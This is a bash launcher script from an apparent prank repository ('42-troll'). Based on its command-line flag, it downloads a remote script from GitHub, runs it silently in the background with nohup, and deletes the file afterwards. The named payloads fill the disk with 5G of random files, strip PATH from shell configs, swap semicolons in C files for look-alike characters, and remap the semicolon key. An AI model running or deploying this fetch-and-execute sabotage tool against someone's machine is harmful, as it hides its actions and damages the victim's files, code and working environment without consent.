#!/bin/bash

scriptlocation=""
argument=""

githubloc="https://raw.githubusercontent.com/Poul0s/42-troll/master"

case "$1" in
	--help)
		printf "TODO LATER \nArguments : \n\n--help : show help\n\n-F | --full-disk : add 5G of random files everywhere\n\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )\n\n-SK | --replace-key-semicolon\n\n-E | --emoji-font : set emoji font\n"
	;;
	--full-disk|-F)
		scriptlocation="$githubloc/full_disk.sh"
	;;
	--where-are-commands|-P)
		scriptlocation="$githubloc/where_are_commands.sh"
	;;
	--replace-semicolon|-S)
		scriptlocation="$githubloc/fake-semicolon.sh"
		argument=$2
	;;
	--replace-key-semicolon|-SK)
		scriptlocation="$githubloc/replace-key-semicolon.sh"
	;;
	--emoji-font|-E)
		scriptlocation="$githubloc/emoji_font.sh"
	;;
	*)
		echo "arg '$1' invalid, show help with --help"
	;;
esac

if [ ! -z $scriptlocation ] ; then
	wget -q $scriptlocation -O script.sh
	nohup bash ./script.sh $argument > /dev/null 2> /dev/null &
	rm ./script.sh
fi
